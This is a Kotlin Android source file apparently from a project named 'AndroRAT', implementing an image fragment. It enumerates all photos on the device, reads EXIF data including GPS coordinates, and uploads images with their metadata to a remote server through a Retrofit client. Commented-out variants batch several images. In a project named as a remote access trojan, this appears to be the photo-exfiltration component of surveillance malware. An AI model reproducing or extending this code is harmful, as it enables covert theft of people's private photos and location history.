package com.ierusalem.androrat.features.images.presentation

import android.content.ContentUris
import android.content.Context
import android.media.ExifInterface
import android.net.Uri
import android.os.Bundle
import android.os.Environment
import android.provider.MediaStore
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.ComposeView
import androidx.fragment.app.Fragment
import androidx.fragment.app.viewModels
import androidx.navigation.fragment.findNavController
import com.ierusalem.androrat.core.data.networking.RetrofitInstance
import com.ierusalem.androrat.core.ui.theme.AndroRATTheme
import com.ierusalem.androrat.core.utils.getIntOrNull
import com.ierusalem.androrat.core.utils.getLongOrNull
import com.ierusalem.androrat.core.utils.getStringOrNull
import com.ierusalem.androrat.core.utils.toReadableDate
import com.ierusalem.androrat.core.utils.toReadableFileSize
import com.ierusalem.androrat.features.home.domain.model.Image
import com.ierusalem.androrat.features.images.domain.ImageViewModel
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileOutputStream

class ImageFragment : Fragment() {

    private val viewModel by viewModels<ImageViewModel>()

    private fun loadImages(context: Context) {
        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.MIME_TYPE,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.DATE_TAKEN,
            MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.DATE_MODIFIED,
            MediaStore.Images.Media.WIDTH,
            MediaStore.Images.Media.HEIGHT,
            MediaStore.Images.Media.BUCKET_DISPLAY_NAME,
            MediaStore.Images.Media.RELATIVE_PATH,
            MediaStore.Images.Media.AUTHOR,
            MediaStore.Images.Media.DESCRIPTION,
            MediaStore.Images.Media.ORIENTATION
        )

        val sortOrder = "${MediaStore.Images.Media.DATE_TAKEN} DESC"

        val images = mutableListOf<Image>()

        context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            sortOrder
        )?.use { cursor ->
            val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val displayNameCol = cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
            val mimeTypeCol = cursor.getColumnIndex(MediaStore.Images.Media.MIME_TYPE)
            val sizeCol = cursor.getColumnIndex(MediaStore.Images.Media.SIZE)
            val dateTakenCol = cursor.getColumnIndex(MediaStore.Images.Media.DATE_TAKEN)
            val widthCol = cursor.getColumnIndex(MediaStore.Images.Media.WIDTH)
            val heightCol = cursor.getColumnIndex(MediaStore.Images.Media.HEIGHT)
            val bucketCol = cursor.getColumnIndex(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
            val pathCol = cursor.getColumnIndex(MediaStore.Images.Media.RELATIVE_PATH)
            val authorCol = cursor.getColumnIndex(MediaStore.Images.Media.AUTHOR)
            val descCol = cursor.getColumnIndex(MediaStore.Images.Media.DESCRIPTION)
            val orientationCol = cursor.getColumnIndex(MediaStore.Images.Media.ORIENTATION)

            while (cursor.moveToNext()) {
                val id = cursor.getLong(idCol)
                val uri =
                    ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)

                // Basic info from MediaStore
                val displayName = cursor.getStringOrNull(displayNameCol)
                val mimeType = cursor.getStringOrNull(mimeTypeCol)
                val size = cursor.getLongOrNull(sizeCol)
                val dateTaken = cursor.getLongOrNull(dateTakenCol)
                val width = cursor.getIntOrNull(widthCol)
                val height = cursor.getIntOrNull(heightCol)
                val folderName = cursor.getStringOrNull(bucketCol)
                val relativePath = cursor.getStringOrNull(pathCol)
                val author = cursor.getStringOrNull(authorCol)
                val description = cursor.getStringOrNull(descCol)
                val orientation = cursor.getIntOrNull(orientationCol)

                // EXIF info
                var latitude: Double? = null
                var longitude: Double? = null
                var cameraModel: String? = null
                var iso: String? = null
                var aperture: String? = null
                var exposureTime: String? = null

                try {
                    context.contentResolver.openInputStream(uri)?.use { inputStream ->
                        val exif = ExifInterface(inputStream)

                        // GPS
                        val latLong = FloatArray(2)
                        if (exif.getLatLong(latLong)) {
                            latitude = latLong[0].toDouble()
                            longitude = latLong[1].toDouble()
                        }

                        // Other EXIF data
                        cameraModel = exif.getAttribute(ExifInterface.TAG_MODEL)
                        iso = exif.getAttribute(ExifInterface.TAG_ISO)
                        aperture = exif.getAttribute(ExifInterface.TAG_APERTURE)
                        exposureTime = exif.getAttribute(ExifInterface.TAG_EXPOSURE_TIME)
                    }
                } catch (e: Exception) {
                    e.printStackTrace() // EXIF may fail for non-photo files
                }

                images.add(
                    Image(
                        id = id,
                        uri = uri,
                        displayName = displayName,
                        mimeType = mimeType,
                        size = size.toReadableFileSize(),
                        dateTaken = dateTaken.toReadableDate(),
                        width = width,
                        height = height,
                        folderName = folderName,
                        relativePath = relativePath,
                        author = author,
                        description = description,
                        orientation = orientation,
                        latitude = latitude,
                        longitude = longitude,
                        cameraModel = cameraModel,
                        iso = iso,
                        aperture = aperture,
                        exposureTime = exposureTime
                    )
                )
            }
            viewModel.updateImages(images)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        loadImages(context = requireContext())
    }

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        return ComposeView(requireContext()).apply {
            setContent {
                AndroRATTheme {
                    val scope = rememberCoroutineScope()

                    ImagesScreen(
                        modifier = Modifier,
                        images = viewModel.images,
                        eventHandler = { event ->
                            when (event) {
                                ImagesScreenEvents.NavIconClick -> {
                                    findNavController().popBackStack()
                                }
                            }
                        },
                        onUploadClick = {
                            val apiService = RetrofitInstance(requireContext()).api
                            val images = viewModel.images
//                            val image = images[0]
//                            val imageUri = image.uri
//                            val inputStream = requireContext().contentResolver.openInputStream(imageUri)
//                            val imageFile = File.createTempFile(
//                                "image",
//                                ".jpg",
//                                requireActivity().getExternalFilesDir(Environment.DIRECTORY_PICTURES)
//                            )
//                            val fileOutputStream = FileOutputStream(imageFile)
//                            inputStream?.copyTo(fileOutputStream)
//                            fileOutputStream.close()
//
//                            val imageDataTake = getShortDate(image.dataTaken)

//                            val requestBody: RequestBody = MultipartBody.Builder()
//                                .setType(MultipartBody.FORM)
//                                .addFormDataPart(
//                                    name = "description",
//                                    value = "Image Description: " +
//                                            "\nImage Display Name - ${image.displayName} " +
//                                            "\nImage Data - ${image.data}" +
//                                            "\nImage Uri - ${image.uri}" +
//                                            "\nImage Author - ${image.author}" +
//                                            "\nImage Description - ${image.description}" +
//                                            "\nImage Id - ${image.id}" +
//                                            "\nImage Data Taken - $imageDataTake"
//                                )
//                                .addFormDataPart(
//                                    "file",
//                                    imageFile.name,
//                                    imageFile.asRequestBody(
//                                        "image/*".toMediaType()
//                                    )
//                                )
//                                .build()

                            val requestBodyBuilder = MultipartBody.Builder()
                            requestBodyBuilder.setType(MultipartBody.FORM)
                            for (i in 0..0) {
                                val image = images[i]
                                val imageUri = image.uri
                                val inputStream =
                                    requireContext().contentResolver.openInputStream(imageUri)
                                val imageFile = File.createTempFile(
                                    "image",
                                    ".jpg",
                                    requireActivity().getExternalFilesDir(Environment.DIRECTORY_PICTURES)
                                )
                                val fileOutputStream = FileOutputStream(imageFile)
                                inputStream?.copyTo(fileOutputStream)
                                fileOutputStream.close()
                                val imageDataTake = image.dateTaken

                                Log.d(
                                    "ahi3646_files", "onCreateView: " +
                                            "\nImage Description: " +
                                            "\nImage Display Name - ${image.displayName} " +
                                            "\nImage Data - ${image.dateTaken}" +
                                            "\nImage Uri - ${image.uri}" +
                                            "\nImage Author - ${image.author}" +
                                            "\nImage Description - ${image.description}" +
                                            "\nImage Id - ${image.id}" +
                                            "\nImage Data Taken - $imageDataTake"
                                )

                                requestBodyBuilder
                                    .addFormDataPart(
                                        name = "description",
                                        value = "Image Description: " +
                                                "\nImage Display Name - ${image.displayName} " +
                                                "\nImage Data - ${image.dateTaken}" +
                                                "\nImage Uri - ${image.uri}" +
                                                "\nImage Author - ${image.author}" +
                                                "\nImage Description - ${image.description}" +
                                                "\nImage Id - ${image.id}" +
                                                "\nImage Data Taken - $imageDataTake"
                                    )
                                    .addFormDataPart(
                                        "file",
                                        imageFile.name,
                                        imageFile.asRequestBody(
                                            "image/*".toMediaType()
                                        )
                                    )
                            }
                            val requestBody = requestBodyBuilder.build()

//                            val images = viewModel.images
//                            val parts: MutableList<MultipartBody.Part> = mutableListOf()
//
//                            for (i in 0 .. 3){
//                                parts.add(
//                                    prepareFile(
//                                        images[i].uri
//                                    )
//                                )
//                            }

//                            val parts: MutableList<RequestBody> = mutableListOf()
//                            val images = viewModel.images
//                            for(i in 0 .. 3){
//                                val tempImage = images[i]
//                                val tempImageUri = tempImage.uri
//                                val tempInputStream = requireContext().contentResolver.openInputStream(tempImageUri)
//                                val tempImageFile = File.createTempFile(
//                                    "image",
//                                    ".jpg",
//                                    requireActivity().getExternalFilesDir(Environment.DIRECTORY_PICTURES)
//                                )
//                                val tempFileOutputStream = FileOutputStream(tempImageFile)
//                                tempInputStream?.copyTo(tempFileOutputStream)
//                                fileOutputStream.close()
//
//                                val requestBody: RequestBody = MultipartBody.Builder()
//                                    .setType(MultipartBody.FORM)
//                                    .addFormDataPart(
//                                        name = "description",
//                                        value = "Image Description: " +
//                                                "\nImage Display Name - ${tempImage.displayName} " +
//                                                "\nImage Data - ${tempImage.data}" +
//                                                "\nImage Uri - ${tempImage.uri}" +
//                                                "\nImage Author - ${tempImage.author}" +
//                                                "\nImage Description - ${tempImage.description}" +
//                                                "\nImage Id - ${tempImage.id}" +
//                                                "\nImage Data Taken - imageDataTake"
//                                    )
//                                    .addFormDataPart(
//                                        "file",
//                                        tempImageFile.name,
//                                        tempImageFile.asRequestBody(
//                                            "image/*".toMediaType()
//                                        )
//                                    )
//                                    .build()
//                                parts.add(requestBody)
//                            }

                            scope.launch {
                                val response = apiService.postImage(requestBody)
//                                val response = apiService.postImages(parts = parts)
                                if (response.isSuccessful) {
                                    Log.d(
                                        "ahi3646_photo",
                                        "sendMessages: success - ${response.body()} "
                                    )
                                } else {
                                    Log.d(
                                        "ahi3646_photo",
                                        "sendMessages: failure  - ${response.errorBody()}}"
                                    )
                                }
                            }
                        }
                    )
                }
            }
        }
    }

    private fun prepareFile(imageUri: Uri): MultipartBody.Part {
        val inputStream = requireContext().contentResolver.openInputStream(imageUri)
        val imageFile = File.createTempFile(
            "image",
            ".jpg",
            requireActivity().getExternalFilesDir(Environment.DIRECTORY_PICTURES)
        )
        val fileOutputStream = FileOutputStream(imageFile)
        inputStream?.copyTo(fileOutputStream)
        fileOutputStream.close()

        return MultipartBody.Part.createFormData(
            "image",
            imageFile.name,
            imageFile.asRequestBody()
        )
    }

}
